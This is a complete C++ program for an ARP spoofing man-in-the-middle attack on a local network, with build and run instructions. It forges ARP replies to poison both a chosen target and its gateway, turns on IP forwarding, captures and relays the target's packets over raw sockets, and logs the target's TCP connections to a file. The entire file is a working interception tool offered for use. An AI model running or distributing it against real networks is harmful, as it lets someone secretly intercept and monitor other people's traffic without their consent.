// Compile: g++ -o arp_framework arp_framework.cpp -lpthread
// Run: sudo ./arp_framework <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <fstream>
#include <sstream>
#include <chrono>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>
#include <map>

class ARPFramework {
private:
    int arpSock, captureSock, forwardSock;
    std::string iface, attackerMAC;
    std::string targetIP, targetMAC, gatewayIP, gatewayMAC;
    std::atomic<bool> running{false};
    std::atomic<uint64_t> packetsForwarded{0};
    std::atomic<uint64_t> packetsCaptured{0};
    std::ofstream logFile;
    std::map<std::string, uint64_t> protoStats;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    static ARPFramework* instance;
    
    ARPFramework(const std::string& i, const std::string& amac,
                 const std::string& tIP, const std::string& tMAC,
                 const std::string& gIP, const std::string& gMAC)
        : iface(i), attackerMAC(amac), targetIP(tIP), targetMAC(tMAC),
          gatewayIP(gIP), gatewayMAC(gMAC) {
        
        arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        captureSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        bind(captureSock, (struct sockaddr*)&sll, sizeof(sll));
        
        forwardSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        bind(forwardSock, (struct sockaddr*)&sll, sizeof(sll));
        
        logFile.open("arp_framework.log", std::ios::app);
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop() {
        while (running.load()) {
            sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
            sendARP(targetIP, attackerMAC, gatewayIP, gatewayMAC);
            usleep(500000);
        }
    }
    
    // Capture all traffic involving target and forward it
    void forwardLoop() {
        uint8_t buffer[65536];
        struct in_addr targetAddr, gatewayAddr;
        inet_pton(AF_INET, targetIP.c_str(), &targetAddr);
        inet_pton(AF_INET, gatewayIP.c_str(), &gatewayAddr);
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(captureSock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(captureSock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct ether_header* eth = (struct ether_header*)buffer;
            if (ntohs(eth->ether_type) != ETH_P_IP) continue;
            
            struct iphdr* ip = (struct iphdr*)(buffer + 14);
            
            // Check if this is target's traffic that needs forwarding
            bool forward = false;
            uint8_t newDstMAC[6];
            
            if (ip->saddr == targetAddr.s_addr) {
                // Target to outside - forward to gateway
                forward = true;
                macToBytes(gatewayMAC, newDstMAC);
                packetsCaptured++;
            } else if (ip->daddr == targetAddr.s_addr) {
                // Outside to target - forward to target
                forward = true;
                macToBytes(targetMAC, newDstMAC);
                packetsCaptured++;
            } else {
                continue;
            }
            
            // Rewrite MAC addresses
            uint8_t srcMACBytes[6];
            macToBytes(attackerMAC, srcMACBytes);
            memcpy(eth->ether_shost, srcMACBytes, 6);
            memcpy(eth->ether_dhost, newDstMAC, 6);
            
            // Update log
            if (ip->protocol == IPPROTO_TCP) {
                struct tcphdr* tcp = (struct tcphdr*)(buffer + 14 + (ip->ihl * 4));
                std::stringstream ss;
                char srcIP[INET_ADDRSTRLEN], dstIP[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &ip->saddr, srcIP, sizeof(srcIP));
                inet_ntop(AF_INET, &ip->daddr, dstIP, sizeof(dstIP));
                ss << "[TCP] " << srcIP << ":" << ntohs(tcp->source)
                   << " -> " << dstIP << ":" << ntohs(tcp->dest);
                protoStats["TCP"]++;
                logFile << ss.str() << "\n";
                logFile.flush();
            } else if (ip->protocol == IPPROTO_UDP) {
                protoStats["UDP"]++;
            } else if (ip->protocol == IPPROTO_ICMP) {
                protoStats["ICMP"]++;
            }
            
            // Forward the packet
            struct sockaddr_ll sll;
            memset(&sll, 0, sizeof(sll));
            sll.sll_family = AF_PACKET;
            sll.sll_ifindex = if_nametoindex(iface.c_str());
            sll.sll_halen = 6;
            memcpy(sll.sll_addr, newDstMAC, 6);
            
            sendto(forwardSock, buffer, bytes, 0, 
                   (struct sockaddr*)&sll, sizeof(sll));
            packetsForwarded++;
        }
    }
    
    // Stats thread
    void statsLoop() {
        while (running.load()) {
            sleep(10);
            std::cout << "\n=== ARP Framework Statistics ===\n";
            std::cout << "Packets captured: " << packetsCaptured.load() << "\n";
            std::cout << "Packets forwarded: " << packetsForwarded.load() << "\n";
            std::cout << "Proto stats:\n";
            for (const auto& p : protoStats) {
                std::cout << "  " << p.first << ": " << p.second << "\n";
            }
            std::cout << "================================\n\n";
        }
    }
    
    void restore() {
        std::cout << "\n[*] Restoring ARP tables...\n";
        for (int i = 0; i < 10; i++) {
            sendARP(gatewayIP, gatewayMAC, targetIP, targetMAC);
            sendARP(targetIP, targetMAC, gatewayIP, gatewayMAC);
            usleep(100000);
        }
    }
    
    static void signalHandler(int) {
        if (instance) {
            instance->running = false;
            instance->restore();
            std::cout << "\n[*] Total captured: " 
                      << instance->packetsCaptured.load() << "\n";
            exit(0);
        }
    }
    
    void run() {
        instance = this;
        signal(SIGINT, signalHandler);
        signal(SIGTERM, signalHandler);
        
        std::cout << "[*] Full ARP MITM Framework\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        std::cout << "[*] Gateway: " << gatewayIP << "\n";
        std::cout << "[*] Auto-restores on Ctrl+C\n\n";
        
        // Enable IP forwarding for traffic not destined to attacker
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        
        running = true;
        std::thread poisonT(&ARPFramework::poisonLoop, this);
        std::thread forwardT(&ARPFramework::forwardLoop, this);
        std::thread statsT(&ARPFramework::statsLoop, this);
        
        while (true) sleep(1);
    }
    
    ~ARPFramework() {
        running = false;
        logFile.close();
        close(arpSock);
        close(captureSock);
        close(forwardSock);
    }
};

ARPFramework* ARPFramework::instance = nullptr;

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>\n";
        return 1;
    }
    ARPFramework framework(argv[6], argv[5], argv[1], argv[2], argv[3], argv[4]);
    framework.run();
    return 0;
}
